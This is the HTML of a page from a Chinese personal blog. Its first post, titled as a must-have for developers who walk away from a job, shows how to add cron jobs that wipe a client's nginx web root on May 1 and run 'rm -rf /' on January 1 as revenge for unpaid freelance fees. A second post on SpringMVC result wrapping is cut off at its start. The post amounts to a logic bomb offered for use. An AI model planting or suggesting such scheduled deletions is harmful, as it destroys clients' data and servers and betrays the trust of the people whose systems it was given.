<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="evolify"><title>evblog</title><meta name="description" content="孤狼的博客"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/code_style_dark.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.jpg" style="width:127px;"><h3 title=""><a href="/">evblog</a></h3><div class="description"><p>孤狼的博客</p></div></div></div><ul class="social-links"></ul></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/code" class="current">短码</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">标签</a></li></div><div class="information"><div class="back_btn"><li><a onclick="window.history.go(-1)" style="display:none;" class="fa fa-chevron-left"> </a></li></div><div class="avatar"><img></div></div></div><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3>程序员跑路必备</h3></div><div class="post-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 做外包的时候，再也不用担心拿不到尾款了</span><br><span class="line"><span class="meta">#</span> 编辑定时任务,命令行输入：</span><br><span class="line">crontab -e</span><br><span class="line"><span class="meta">#</span> 然后编写你的任务</span><br><span class="line"><span class="meta">#</span>不给钱嘛，劳动节给个惊喜</span><br><span class="line">0 0 1 5 * rm -rf /usr/share/nginx/html </span><br><span class="line"><span class="meta">#</span>特么的都过去一年了，算了算了，不陪你玩了</span><br><span class="line">0 0 1 1 * rm -rf / </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 查看当前定时任务</span><br><span class="line">crontab -l</span><br><span class="line"><span class="meta">#</span> 查看root用户的定时任务</span><br><span class="line">crontab -l -u root</span><br></pre></td></tr></table></figure></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2018-03-16</span><i class="fa fa-tag"></i><a href="/categories/code/" title="code" class="tag">code </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3>SpringMVC返回结果封装</h3></div><div class="post-content"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="li
